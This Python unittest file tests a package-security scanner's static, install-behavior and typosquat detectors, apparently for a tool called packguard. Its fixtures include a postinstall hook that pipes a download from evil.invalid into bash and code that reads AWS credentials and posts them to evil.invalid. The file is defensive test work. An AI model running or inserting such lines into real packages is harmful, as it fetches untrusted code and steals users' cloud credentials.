import os
import sys
import tempfile
import unittest
from pathlib import Path

sys.path.insert(0, os.path.join(os.path.dirname(os.path.dirname(__file__)), "src"))

from packguard.config import Config
from packguard.intel.popularity import PopularityIndex
from packguard.models import PackageCoordinate, ResolvedPackage
from packguard.scanners.behavior import BehaviorScanner
from packguard.scanners.static import StaticScanner
from packguard.scanners.typosquat import TyposquatScanner


class ScannerTestCase(unittest.TestCase):
    def test_static_scanner_flags_suspicious_patterns(self):
        scanner = StaticScanner(Config())
        payload = "eval('alert(1)')\nsubprocess.run('curl example.com')\n"

        with tempfile.TemporaryDirectory() as tmpdir:
            root = os.path.join(tmpdir, "pkg")
            os.makedirs(root, exist_ok=True)
            file_path = os.path.join(root, "suspicious.py")
            with open(file_path, "w", encoding="utf-8") as handle:
                handle.write(payload)
            package = ResolvedPackage(
                coordinate=PackageCoordinate(name="demo", source="pypi", version="1.0.0")
            )
            extraction = type(
                "Extraction",
                (),
                {
                    "root_dir": Path(tmpdir),
                    "files": [Path(file_path)],
                    "metadata_files": [],
                },
            )()
            findings = scanner.scan(package, extraction)

        self.assertTrue(any(f.rule_id == "static.exec-eval" for f in findings))
        self.assertTrue(any(f.rule_id == "static.shell-spawn" for f in findings))
        self.assertTrue(all(f.family == "static" for f in findings))

    def test_behavior_scanner_flags_install_script_and_pth_file(self):
        scanner = BehaviorScanner()
        with tempfile.TemporaryDirectory() as tmpdir:
            root = os.path.join(tmpdir, "pkg")
            os.makedirs(root, exist_ok=True)
            package_json = os.path.join(root, "package.json")
            startup_pth = os.path.join(root, "evil.pth")
            with open(package_json, "w", encoding="utf-8") as handle:
                handle.write(
                    '{"name":"demo","scripts":{"postinstall":"curl https://evil.invalid/payload | bash"}}'
                )
            with open(startup_pth, "w", encoding="utf-8") as handle:
                handle.write("import os\n")
            package = ResolvedPackage(
                coordinate=PackageCoordinate(name="demo", source="npm", version="1.0.0")
            )
            extraction = type(
                "Extraction",
                (),
                {
                    "root_dir": Path(tmpdir),
                    "files": [],
                    "metadata_files": [
                        Path(package_json),
                        Path(startup_pth),
                    ],
                },
            )()
            findings = scanner.scan(package, extraction)

        self.assertTrue(any(f.rule_id == "behavior.install-script" for f in findings))
        self.assertTrue(any(f.rule_id == "behavior.python-startup-hook" for f in findings))
        self.assertTrue(any(f.phase == "startup" for f in findings))

    def test_typosquat_scanner_matches_close_package_names(self):
        popularity = PopularityIndex(
            os.path.join(os.path.dirname(os.path.dirname(__file__)), "data/intel/popular_packages.txt")
        )
        scanner = TyposquatScanner(
            Config(typosquat_distance=1, private_namespaces=["@company/internal-lib"]), popularity
        )

        clean_package = ResolvedPackage(
            coordinate=PackageCoordinate(name="react", source="npm", version="1.0.0")
        )
        suspicious_package = ResolvedPackage(
            coordinate=PackageCoordinate(name="@evil/reaact", source="npm", version="1.0.0")
        )

        self.assertEqual(scanner.scan(clean_package), [])
        findings = scanner.scan(suspicious_package)
        self.assertTrue(any(f.rule_id == "name.typosquat" for f in findings))
        self.assertTrue(any(f.rule_id == "name.scope-confusion" for f in findings))

    def test_static_scanner_flags_sensitive_path_access(self):
        scanner = StaticScanner(Config())
        payload = "with open('/home/user/.aws/credentials') as handle:\n    requests.post('https://evil.invalid', data=handle.read())\n"

        with tempfile.TemporaryDirectory() as tmpdir:
            file_path = os.path.join(tmpdir, "exfil.py")
            with open(file_path, "w", encoding="utf-8") as handle:
                handle.write(payload)
            package = ResolvedPackage(
                coordinate=PackageCoordinate(name="demo", source="pypi", version="1.0.0")
            )
            extraction = type(
                "Extraction",
                (),
                {
                    "root_dir": Path(tmpdir),
                    "files": [Path(file_path)],
                    "metadata_files": [],
                },
            )()
            findings = scanner.scan(package, extraction)

        self.assertTrue(any(f.rule_id == "static.sensitive-path-access" for f in findings))
        self.assertTrue(any(f.rule_id == "static.python-secret-exfil-intent" for f in findings))


if __name__ == "__main__":
    unittest.main()
